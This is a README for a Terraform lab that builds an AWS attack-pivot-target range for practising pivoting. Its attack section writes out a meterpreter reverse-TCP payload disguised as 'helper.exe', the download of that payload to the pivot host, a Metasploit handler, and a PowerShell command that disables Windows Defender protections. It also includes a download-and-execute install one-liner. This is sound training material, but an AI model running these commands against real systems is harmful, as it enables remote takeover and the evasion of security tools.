# SANS Pivot Cheat Sheet Lab
This serves as a tool for cybersecurity enthusiasts to better understand pivoting through an environment. The central reference is the [SANS Pivot Cheat Sheet](https://www.sans.org/posters/pivot-cheat-sheet/). Some code used from Terraform's [HashiCorp Learn platform](https://learn.hashicorp.com/tutorials/terraform/cloud-init?in=terraform/provision).

## Dependencies
- [AWS IAM Credentials](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html) to interact with an AWS account
- [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html) installed
- [Terraform](https://www.terraform.io/downloads.html) installed

## Files
- Readme.md:    This file explains the repository
- main.tf:      Overall architecture of the Terraform project
- variables.tf: Contains values used in production
- output.tf:    Defines outputs requested from the build
- scripts/:     YAML config files for instances
- assets/:      Files copied to instances

## Steps
### Create Keys and Apply to YAML Configs
- `ssh-keygen -t rsa -C "your_email@example.com" -f ../tf-cloud-init`
- Look for `ssh_authorized_keys:` in the YAML files in `scripts/`. Replace the example public keys with the contents of your new `tf-cloud-init.pub`.  One-liner:
  - `sed -i "s:ssh-rsa.*$:$(cat ../tf-cloud-init.pub|tr -d '\n'):" ./scripts/*yaml`

### Set Default AWS Credentials
- Check to see what you have in your `~/.aws/credentials` file:
  - `cat ~/.aws/credentials`
- Set your current shell to use the right set:
  - `export AWS_PROFILE=Your-Favorite-IAM`

### Create the Range with Terraform
```
$ terraform init
[...]
Terraform has been successfully initialized!
[...]
$ terraform fmt
$ terraform validate
Success! The configuration is valid.
$ terraform apply
[...]
Do you want to perform these actions?
  Terraform will perform the actions described above.
  Only 'yes' will be accepted to approve.

  Enter a value: yes
[...]
Apply complete! Resources: 11 added, 0 changed, 0 destroyed.

Outputs:

linux_attack_private_ip = "10.1.1.1"
linux_attack_public_ip = "18.19.20.21"
linux_pivot_private_ip = "10.1.2.1"
linux_pivot_public_ip = "3.4.5.6"
linux_target_private_ip = "10.1.3.1"
linux_target_public_ip = "1.3.3.7"
sg_pivot = "sg-0123456789abcdef0"
vpc = "vpc-0123456789abcdef0"
$ terraform show #optional - to show assets and addresses again
```

### Optionally: Create a Windows Instance as Another Pivot
- From the AWS Console, Launch Instance
- Pick a Windows AMI - maybe Server 2022 (ami-0b9fc4f4583318dff)
- Next, then _t2micro_ is probably OK
- Next, then VPC from the Terraform output
- Set Auto-Assign public IP to _Enable_
- Set Primary IP addresses to _10.1.2.2_
- Next
- Next, then add tags like "Project:PivotPlay" and "Name:Windows-Pivot"
- Next, then pick the _sg_pivot_ security group
- Review, then _Launch_
- Create a new key and **save** them
- Once the new instance is up, select it in the Instances view and Connect using the key you just created
- Optionally, you can do this with the AWS CLI:
  - `aws ec2 create-key-pair --key-name pivot-labz --region us-east-2`
  - Save the private key to something like `../pivot-labz.pem` so you can get the instance password later
  - `aws ec2 describe-subnets --region us-east-2` # to get the subnet-id for the next command
  - `aws ec2 run-instances --image-id ami-0b9fc4f4583318dff --count 1 --instance-type t2.micro --key-name pivot-labz --security-group-ids sg-0123456789abcdef0 --subnet-id subnet-6e7f829e --region us-east-2`
  - Noting the instance-id created, get the password with `aws ec2 get-password-data --instance-id i-0123456789abcdef0 --priv-launch-key ../pivot-labz.pem --region us-east-2`

### Optional Windows Steps
- Install chocolatey package manager: `Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))`
- Install Nmap or other tools: `choco install nmap`

### Connect to the Attack Machine with the IP from the Terraform Output
- `ssh attack@AttackIPHere -i ../tf-cloud-init`
- If you've lost track of those IPs, just `terraform show` to see them again

### Maybe Perform Some Attacks!
- `attack $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=8888 -f exe -o helper.exe`
- `pivot PS> curl 10.1.1.1:8000/helper.exe -OutFile helper.exe`
- `attack $ msfconsole`
- `attack msf6> use exploit/multi/handler`
- `attack msf6> set payload windows/x64/meterpreter/reverse_tcp`
- `attack msf6> set LHOST eth0`
- `attack msf6> set LPORT 8888`
- `attack msf6> run`
- `pivot PS> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend`
- `pivot PS> .\helper.exe`

### All Done?
```
$ terraform destroy
[...]
Do you really want to destroy all resources?
  Terraform will destroy all your managed infrastructure, as shown above.
  There is no undo. Only 'yes' will be accepted to confirm.

  Enter a value: yes
[...]
Destroy complete! Resources: 11 destroyed.
$ terraform show #optional - to show assets and addresses again
```
